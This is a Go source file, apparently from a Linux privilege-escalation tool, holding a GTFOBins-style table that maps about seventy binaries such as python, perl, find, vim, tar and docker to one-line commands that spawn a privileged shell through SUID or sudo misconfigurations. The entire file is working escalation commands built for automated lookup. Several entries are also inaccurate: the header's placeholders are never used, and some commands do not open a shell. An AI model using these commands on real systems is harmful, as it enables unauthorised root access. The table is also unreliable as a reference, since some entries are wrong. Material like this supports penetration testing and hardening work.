package main

// GTFOBins database — most commonly exploitable Linux binaries.
// Each entry maps a binary name to its command string.
// Variables: {shell} → spawns shell, {cmd}→ executes command, {read}→ reads file

var gtfoLookup = map[string]string{}

func init() {
	// SUID bins — spawn root shell
	suidBins := []string{
		"python", "python2", "python3", "python3.8", "python3.9", "python3.10", "python3.11", "python3.12", "python3.13",
		"perl", "perl5",
		"php", "php5", "php7", "php8", "php8.1", "php8.2",
		"ruby", "ruby2", "ruby3",
		"lua", "lua5.3", "lua5.4",
		"node", "nodejs",
		"bash", "dash", "zsh", "ksh", "fish", "sh",
	}

	shellCmd := map[string]string{
		"python":     `python3 -c 'import os; os.execlp("sh","sh","-p")'`,
		"python2":    `python -c 'import os; os.execlp("sh","sh","-p")'`,
		"python3":    `python3 -c 'import os; os.execlp("sh","sh","-p")'`,
		"python3.8":  `python3.8 -c 'import os; os.execlp("sh","sh","-p")'`,
		"python3.9":  `python3.9 -c 'import os; os.execlp("sh","sh","-p")'`,
		"python3.10": `python3.10 -c 'import os; os.execlp("sh","sh","-p")'`,
		"python3.11": `python3.11 -c 'import os; os.execlp("sh","sh","-p")'`,
		"python3.12": `python3.12 -c 'import os; os.execlp("sh","sh","-p")'`,
		"python3.13": `python3.13 -c 'import os; os.execlp("sh","sh","-p")'`,
		"perl":       `perl -e 'exec "sh","-p"'`,
		"perl5":      `perl -e 'exec "sh","-p"'`,
		"php":        `php -r 'pcntl_exec("/bin/sh", array("-p"));'`,
		"php5":       `php -r 'pcntl_exec("/bin/sh", array("-p"));'`,
		"php7":       `php -r 'pcntl_exec("/bin/sh", array("-p"));'`,
		"php8":       `php -r 'pcntl_exec("/bin/sh", array("-p"));'`,
		"php8.1":     `php8.1 -r 'pcntl_exec("/bin/sh", array("-p"));'`,
		"php8.2":     `php8.2 -r 'pcntl_exec("/bin/sh", array("-p"));'`,
		"ruby":       `ruby -e 'exec "/bin/sh","-p"'`,
		"ruby2":      `ruby -e 'exec "/bin/sh","-p"'`,
		"ruby3":      `ruby -e 'exec "/bin/sh","-p"'`,
		"lua":        `lua -e 'os.execute("/bin/sh -p")'`,
		"lua5.3":     `lua5.3 -e 'os.execute("/bin/sh -p")'`,
		"lua5.4":     `lua5.4 -e 'os.execute("/bin/sh -p")'`,
		"node":       `node -e 'require("child_process").spawn("/bin/sh",["-p"],{stdio:"inherit"})'`,
		"nodejs":     `nodejs -e 'require("child_process").spawn("/bin/sh",["-p"],{stdio:"inherit"})'`,
		"bash":       `bash -p`,
		"dash":       `dash -p`,
		"zsh":        `zsh`,
		"ksh":        `ksh -p`,
		"fish":       `fish`,
		"sh":         `sh -p`,
	}

	sudoOnly := map[string]string{
		"find":    `find . -exec /bin/sh -p \; -quit`,
		"vim":     `vim -c ':!/bin/sh -p'`,
		"vi":      `vi -c ':!/bin/sh -p'`,
		"less":    `less /etc/passwd; !/bin/sh -p`,
		"more":    `more /etc/passwd; !/bin/sh -p`,
		"man":     `man man; !/bin/sh -p`,
		"awk":     `awk 'BEGIN {system("/bin/sh -p")}'`,
		"gawk":    `gawk 'BEGIN {system("/bin/sh -p")}'`,
		"nawk":    `nawk 'BEGIN {system("/bin/sh -p")}'`,
		"sed":     `sed -n '1e /bin/sh -p' /etc/hosts`,
		"gdb":     `gdb -nx -ex '!sh -p' -ex quit`,
		"nmap":    `echo "os.execute('/bin/sh -p')" > /tmp/nmap.script; nmap --script=/tmp/nmap.script`,
		"tcpdump": `echo $'id\n/bin/sh -p' > /tmp/.t; tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/.t -Z root`,
		"tar":     `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`,
		"zip":     `zip /tmp/test.zip /etc/hosts -T -TT '/bin/sh -p #'`,
		"unzip":   `unzip -K test.zip -d /tmp`,
		"rsync":   `rsync -e 'sh -c "sh -p 0<&2 1>&2"' 127.0.0.1:/dev/null`,
		"scp":     `scp -S /path/to/script x y:`,
		"socat":   `socat stdin exec:/bin/sh`,
		"env":     `env /bin/sh -p`,
		"nice":    `nice /bin/sh -p`,
		"timeout": `timeout 7d /bin/sh -p`,
		"stdbuf":  `stdbuf -i0 /bin/sh -p`,
		"watch":   `watch -x sh -c 'reset; exec sh -p 1>&0 2>&0'`,
		"make":    `COMMAND='/bin/sh -p' make -s`,
		"pip":     `pip install --editable=. --no-deps; echo "import pty; pty.spawn('/bin/sh')" > setup.py`,
		"pip3":    `pip3 install --editable=. --no-deps; echo "import pty; pty.spawn('/bin/sh')" > setup.py`,
		"npm":     `npm exec sh -p`,
		"gem":     `gem open -e '/bin/sh -p' rdoc`,
		"git":     `git -p help config; !/bin/sh -p`,
		"ssh":     `ssh -o ProxyCommand=';/bin/sh -p 0<&2 1>&2' x`,
		"docker":  `docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh`,
		"lxc":     `lxc exec container /bin/sh`,
		"apache2": `apache2 -f /etc/passwd`,
		"cpan":    `cpan; !/bin/sh -p`,
		"ed":      `ed; !/bin/sh -p`,
		"ex":      `ex; !/bin/sh -p`,
		"ftp":     `ftp; !/bin/sh -p`,
		"wall":    `wall --nobanner; exec /bin/sh -p`,
		"systemctl": `systemctl; !/bin/sh -p`,
		"journalctl": `journalctl; !/bin/sh -p`,
		"mysql":   `mysql -e '\\! /bin/sh -p'`,
		"psql":    `psql -c '\\!' postgres`,
		"sqlite3": `sqlite3 /dev/null '.shell /bin/sh -p'`,
	}

	// Build lookup
	for _, bin := range suidBins {
		if cmd, ok := shellCmd[bin]; ok {
			gtfoLookup[bin] = cmd
		}
	}
	for bin, cmd := range sudoOnly {
		gtfoLookup[bin] = cmd
	}
}

var suidShellBins = map[string]bool{
	"python": true, "python2": true, "python3": true, "python3.8": true, "python3.9": true,
	"python3.10": true, "python3.11": true, "python3.12": true, "python3.13": true,
	"perl": true, "perl5": true, "php": true, "php5": true, "php7": true, "php8": true, "php8.1": true, "php8.2": true,
	"ruby": true, "ruby2": true, "ruby3": true, "lua": true, "lua5.3": true, "lua5.4": true,
	"node": true, "nodejs": true,
	"bash": true, "dash": true, "zsh": true, "ksh": true, "fish": true, "sh": true,
}

func getCommand(bin string) (string, bool) {
	cmd, ok := gtfoLookup[bin]
	return cmd, ok
}

func isSuidShellBin(bin string) bool {
	return suidShellBins[bin]
}
